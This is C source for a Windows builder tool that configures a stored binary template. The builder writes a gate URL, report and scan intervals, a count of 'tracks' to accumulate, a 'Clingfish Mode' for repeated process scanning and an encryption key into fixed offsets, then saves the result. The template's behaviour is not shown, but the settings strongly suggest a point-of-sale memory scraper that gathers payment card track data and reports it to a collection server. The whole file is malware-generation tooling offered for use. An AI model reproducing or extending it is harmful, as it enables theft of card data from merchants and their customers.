#include <stdio.h>

void build(WCHAR *filePath){
	HANDLE hFile;
	BOOL writeResult = FALSE;
	DWORD dwBytesWritten = 0;

	hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		writeToLog(L"\r\nCannot create file - build aborted!\r\n");
		EnableWindow(hBuildButton, TRUE);
		return;
	}

	writeResult = WriteFile(hFile, (LPCVOID)file, DUMPSIZE, &dwBytesWritten, NULL);
	if (writeResult == FALSE || dwBytesWritten != DUMPSIZE){
		writeToLog(L"\r\nError writing to file - build aborted!\r\n");
		EnableWindow(hBuildButton, TRUE);
		return;
	}

	writeToLog(L"\r\nBuild successfully finished!\r\n");
	CloseHandle(hFile);

	EnableWindow(hBuildButton, TRUE);
}

int writeToBuild(WCHAR *value, int offset){
	char *charStr;
	int i, length;

	length = wcslen(value);
	charStr = (char*)malloc(sizeof(char) * (length + 1));
	wcstombs(charStr, value, length + 1);

	for (i=offset; i<offset+length; i++)
		file[i] = charStr[i-offset];
	file[i] = '\0';
}

WCHAR *getInputValue(HWND hWnd){
	int length;
	WCHAR *result;
	
	length = GetWindowTextLength(hWnd);
	if (length == 0){
		writeToLog(L"Missing input - build aborted!\r\n");
		EnableWindow(hBuildButton, TRUE);
		return NULL;
	}
	length ++;
	result = (WCHAR*)malloc(sizeof(WCHAR) * length);
	GetWindowText(hWnd, result, length);

	return result;
}

wchar_t *charToWidechar(char *charArray){
    wchar_t *wString = (wchar_t*)malloc(sizeof(wchar_t)*(strlen(charArray)+1));
    mbstowcs(wString, charArray, strlen(charArray)+1);
    return wString;
}

void generateBuild(HWND hwnd){
	LPWSTR gateURL, reportsPause, scanPause, tracksNum, clingfishPause, scanPauseAfterClingfishMode, firstEncKey, outputPath;
	char debugString[100], enableClingfishMode, enableDebugMode;
	int i, j, k, numLength, gateURLOffset, reportsPauseOffset, scanPauseOffset, tracksArrSizeOffset, useClingfishModeOffset, clingfishPauseOffset, scanPauseAfterClingfishOffset, firstEncKeyOffset, debugModeOffset;
	UINT btnCheckStatus;

	/*
	58172 - DEBUG_MODE
	58200 - GATE_URL
	58328 - SCAN_PAUSE_MINUTES
	58360 - SEND_PAUSE_MINUTES
	58392 - USE_CLINGFISH_MODE
	58424 - CLINGFISH_PAUSE_MINUTES
	58460 - SCAN_PAUSE_AFTER_CLINGFISH_MINUTES
	58508 - TRACKS_ARR_SIZE
	58536 - FIRST_ENC_KEY
	*/

	
	debugModeOffset = 58172;
	gateURLOffset = 58200;
	scanPauseOffset = 58328;
	reportsPauseOffset = 58360;
	useClingfishModeOffset = 58392;
	clingfishPauseOffset = 58424;
	scanPauseAfterClingfishOffset = 58460;
	tracksArrSizeOffset = 58508;
	firstEncKeyOffset = 58536;

	/* This code is used to get the offsets */
	/*for (i=0; i<DUMPSIZE; i++)
		if (file[i] == 'P' && file[i+1] == 'L' && file[i+2] == 'A'){
			for (j = i; file[j] != 0x00; j--);
			sprintf(debugString, "%d - ", j+1);
			numLength = strlen(debugString);
			for (k = j + 1; k < i - 1; k++)
				debugString[numLength + k - j - 1] = file[k];
			debugString[numLength + k - j - 1] = '\r';
			debugString[numLength + k - j] = '\n';
			debugString[numLength + k - j + 1] = '\0';
			writeToLog(charToWidechar(debugString));
		}*/

	writeToLog(L"Build started...\r\n");

	writeToLog(L"Gate URL: ");
	gateURL = getInputValue(hGateURLInput);
	if (gateURL == NULL)
		return;
	writeToLog(gateURL);
	writeToBuild(gateURL, gateURLOffset);
	
	writeToLog(L"\r\nPause between reports (milliseconds): ");
	reportsPause = getInputValue(hReportsPauseInput);
	if (reportsPause == NULL)
		return;
	writeToLog(reportsPause);
	writeToBuild(reportsPause, reportsPauseOffset);

	writeToLog(L"\r\nPause between complete scans (milliseconds): ");
	scanPause = getInputValue(hScanPauseInput);
	if (scanPause == NULL)
		return;
	writeToLog(scanPause);
	writeToBuild(scanPause, scanPauseOffset);

	writeToLog(L"\r\nMaximum number of tracks to be accumulated between reports: ");
	tracksNum = getInputValue(hTracksNumInput);
	if (tracksNum == NULL)
		return;
	writeToLog(tracksNum);
	writeToBuild(tracksNum, tracksArrSizeOffset);

	btnCheckStatus = IsDlgButtonChecked(hwnd, IDC_ENABLE_CLINGFISH_MODE);
	if (btnCheckStatus == BST_CHECKED){
		writeToLog(L"\r\nClingfish Mode enabled");
		enableClingfishMode = '1';

		writeToLog(L"\r\n -- Pause between Clingfish Mode scans of a process (milliseconds): ");
		clingfishPause = getInputValue(hClingfishPauseInput);
		if (clingfishPause == NULL)
			return;
		writeToLog(clingfishPause);
		writeToBuild(clingfishPause, clingfishPauseOffset);

		writeToLog(L"\r\n -- Pause between complete scans after Clingfish Mode has been enabled (milliseconds): ");
		scanPauseAfterClingfishMode = getInputValue(hScanPauseAfterClingfishModeInput);
		if (scanPauseAfterClingfishMode == NULL)
			return;
		writeToLog(scanPauseAfterClingfishMode);
		writeToBuild(scanPauseAfterClingfishMode, scanPauseAfterClingfishOffset);
	} else if (btnCheckStatus == BST_UNCHECKED){
		writeToLog(L"\r\nClingfish Mode disabled");
		enableClingfishMode = '0';
		clingfishPause = NULL;
		scanPauseAfterClingfishMode = NULL;
	}
	file[useClingfishModeOffset] = enableClingfishMode;

	writeToLog(L"\r\nFirst encryption key to be used: ");
	firstEncKey = getInputValue(hFirstEncKeyInput);
	if (firstEncKey == NULL)
		return;
	writeToLog(firstEncKey);
	writeToBuild(firstEncKey, firstEncKeyOffset);

	btnCheckStatus = IsDlgButtonChecked(hwnd, IDC_ENABLE_DEBUG_MODE);
	if (btnCheckStatus == BST_CHECKED){
		writeToLog(L"\r\nATTENTION! Debug Mode enabled!");
		enableDebugMode = '1';
	} else if (btnCheckStatus == BST_UNCHECKED){
		writeToLog(L"\r\nDebug Mode disabled");
		enableDebugMode = '0';
	}
	file[debugModeOffset] = enableDebugMode;

	writeToLog(L"\r\nBuild output path: ");
	outputPath = getInputValue(hOutputPathInput);
	if (outputPath == NULL)
		return;
	writeToLog(outputPath);

	build(outputPath);
}